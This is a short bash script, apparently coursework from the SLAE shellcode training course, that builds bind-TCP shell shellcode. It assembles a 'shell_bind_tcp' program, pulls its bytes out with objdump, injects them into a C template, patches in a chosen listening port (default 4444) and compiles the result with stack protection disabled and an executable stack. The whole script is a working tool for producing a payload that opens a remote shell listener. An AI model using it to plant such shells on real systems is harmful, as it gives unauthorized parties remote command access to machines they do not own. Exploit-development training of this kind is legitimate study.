#!/bin/bash
#Author:SLAE-755 

port=4444
if [ $# -eq 0 ]
  then
    echo "[+] No port provided.. Using Default port 4444"
elif [ $1 -lt 1024 ] || [ $1 -gt 65535 ]
  then
    echo "[+] No valid port provided.. Using Default port 4444"
    echo "[+] Custom port must be greater than 1024 and lower than 65536"
else
   port=$1
   echo "[+] Building shellcode with Custom port $1"
fi


./compile.sh shell_bind_tcp


port=$(printf "%X" $port)
port_hex=$(echo $port | awk '{printf("\\x%s\\x%s",substr($0,1,2),substr($0,3,4)); }' | sed "s/\\\/\\\\\\\\/g")


payload=$(objdump -d shell_bind_tcp|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g')
cp shellcode_template.c shellcode.c
payload2=$(echo $payload | sed "s/\\\/\\\\\\\/g")

#injecting shellcode
sed  -i "s/XXX/$payload2/g" shellcode.c

#cahnging port in the shellcode
sed  -i "s/\\\x11\\\x5c/$port_hex/g" shellcode.c

gcc -m32 -fno-stack-protector -z execstack shellcode.c -o shellcode
